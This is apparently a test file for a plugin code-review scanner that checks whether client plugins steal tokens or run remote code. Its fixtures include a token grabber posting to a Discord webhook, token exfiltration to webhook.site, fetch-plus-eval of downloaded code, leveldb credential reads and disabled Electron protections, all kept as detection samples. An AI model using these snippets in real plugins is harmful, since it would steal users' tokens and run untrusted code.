import { describe, expect, test } from "bun:test";
import { readdirSync, readFileSync, existsSync } from "fs";
import { join } from "path";

import { reviewCode } from "../src/shared/codeReview";

/** A bundle the way Bun builds a plugin: CommonJS, @evi/api required as import_api, not minified */
const bundle = (body: string) => `var import_api = require("@evi/api");
// plugins/demo/index.ts
${body}
module.exports = { default: plugin };`;

const ids = (r: ReturnType<typeof reviewCode>) => r.flags.map(f => f.id);
const flag = (r: ReturnType<typeof reviewCode>, id: string) => r.flags.find(f => f.id === id)!;

describe("code review: what plugins shouldn’t do", () => {
    test("a token grabber posting to a webhook is danger, with the lines", () => {
        const code = bundle(`var plugin = (0, import_api.definePlugin)({
  start() {
    const token = (0, import_api.findByProps)("getToken").getToken();
    fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz_ABCDEFG", { method: "POST", body: token });
  },
});`);
        const r = reviewCode({ code });
        expect(r.verdict).toBe("danger");
        expect(ids(r)).toEqual(expect.arrayContaining(["token", "webhook"]));
        const token = flag(r, "token");
        expect(token.hits[0].line).toBe(5);
        expect(token.hits[0].file).toBe("index.js");
        expect(code.slice(token.hits[0].at, token.hits[0].at + token.hits[0].length)).toBe('"getToken"');
        expect(r.headline).toContain("plugins shouldn’t do");
    });

    test("localStorage token, exfil hosts and miners", () => {
        const r = reviewCode({ code: bundle(`var t = localStorage.getItem("token");
fetch("https://webhook.site/abc?t=" + t); fetch("https://api.telegram.org/bot1/sendMessage");
// coinhive
var plugin = {};`) });
        expect(ids(r)).toEqual(expect.arrayContaining(["token", "exfil"]));
        expect(flag(r, "exfil").details).toEqual(["webhook.site", "api.telegram.org"]);
        // Whole-line comments are blanked (bundlers keep them): the miner name in one isn't code
        expect(ids(r)).not.toContain("mining");
    });

    test("code it downloads: fetch plus eval is danger, eval alone is to check", () => {
        const downloads = reviewCode({ code: bundle(`fetch("https://x.example.net/p.js").then(r => r.text()).then(t => eval(t)); var plugin = {};`) });
        expect(flag(downloads, "dynamicCode").severity).toBe("danger");
        expect(flag(downloads, "dynamicCode").title).toBe("Can run code it downloads");

        const local = reviewCode({ code: bundle(`var f = new Function("a", "return a"); var plugin = {};`) });
        expect(flag(local, "dynamicCode").severity).toBe("warn");

        const script = reviewCode({ code: bundle(`var s = document.createElement("script"); s.src = "https://x.net/a.js"; var plugin = {};`) });
        expect(flag(script, "remoteScript").severity).toBe("danger");
    });

    test("obfuscation needs a few _0x names, not one", () => {
        expect(ids(reviewCode({ code: bundle(`var _0x1a2b = 1; var plugin = {};`) }))).not.toContain("obfuscated");
        const r = reviewCode({ code: bundle(`var _0x1a2b=['\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f'];function _0x3c4d(a){return _0x1a2b[a];} _0x3c4d(0); var plugin = {};`) });
        expect(ids(r)).toEqual(expect.arrayContaining(["obfuscated", "encoded"]));
    });

    test("the page side asking for Node or Electron", () => {
        const r = reviewCode({ code: bundle(`var cp = require("child_process"); var jsx = require("react/jsx-runtime"); var plugin = {};`) });
        expect(flag(r, "pageEscape").details).toEqual(["child_process"]);
        expect(flag(r, "pageEscape").count).toBe(1);
    });

    test("native.js: grabbers, programs and Electron's protections", () => {
        const nativeCode = `var import_fs = require("fs"); var import_child_process = require("child_process");
var p = require("path").join(process.env.APPDATA, "discord", "Local Storage", "leveldb");
import_fs.readdirSync(p);
import_child_process.exec("curl https://x.net");
new BrowserWindow({ webPreferences: { nodeIntegration: true, contextIsolation: false } });
/^a$/.exec("a");`;
        const r = reviewCode({ code: bundle("var plugin = {};"), nativeCode });
        expect(r.verdict).toBe("danger");
        expect(flag(r, "secrets").details).toEqual(["Local Storage", "leveldb"]);
        expect(flag(r, "electronSafety").details).toEqual(["nodeIntegration:true", "contextIsolation:false"]);
        // The require and the call; a regex's exec isn't a program
        expect(flag(r, "programs").count).toBe(2);
        expect(flag(r, "programs").hits.every(h => h.file === "native.js")).toBe(true);
    });

    test("only page rules read index.js and only native rules read native.js", () => {
        const r = reviewCode({ code: bundle(`import_fs.writeFileSync("a", "b"); var plugin = {};`), nativeCode: `el.innerHTML = x;` });
        expect(ids(r)).not.toContain("files");
        expect(ids(r)).not.toContain("rawHtml");
    });

    test("against the store's version, only what's new is marked new", () => {
        const before = bundle(`el.innerHTML = "<b>x</b>"; var plugin = {};`);
        const after = bundle(`el.innerHTML = "<b>x</b>"; var t = getToken(); var plugin = {};`);
        const r = reviewCode({ code: after, previous: { version: "1.0.0", code: before } });
        expect(flag(r, "token").new).toBe(true);
        expect(flag(r, "rawHtml").new).toBe(false);
        expect(r.comparedWith).toBe("1.0.0");
        expect(r.headline).toContain("1 new since 1.0.0");
        expect(reviewCode({ code: after }).flags.every(f => f.new === undefined)).toBe(true);
    });

    test("a plain plugin is clean", () => {
        const r = reviewCode({ code: bundle(`var plugin = (0, import_api.definePlugin)({ start() { console.log("hi"); } });`) });
        expect(r.verdict).toBe("clean");
        expect(r.flags).toEqual([]);
    });
});

describe("code review: Evi's own plugins", () => {
    // Built plugins (bun run build); none of ours does anything a reviewer should reject
    const root = join(import.meta.dir, "..", "dist", "plugins");
    const built = existsSync(root) ? readdirSync(root).filter(id => existsSync(join(root, id, "index.js"))) : [];
    test.skipIf(!built.length)("none of them is flagged danger", () => {
        const dangerous = built.flatMap(id => {
            const native = join(root, id, "native.js");
            const r = reviewCode({
                code: readFileSync(join(root, id, "index.js"), "utf8"),
                nativeCode: existsSync(native) ? readFileSync(native, "utf8") : null,
                manifest: JSON.parse(readFileSync(join(root, id, "manifest.json"), "utf8")),
            });
            return r.flags.filter(f => f.severity === "danger").map(f => `${id}: ${f.id}`);
        });
        expect(dangerous).toEqual([]);
    });
});
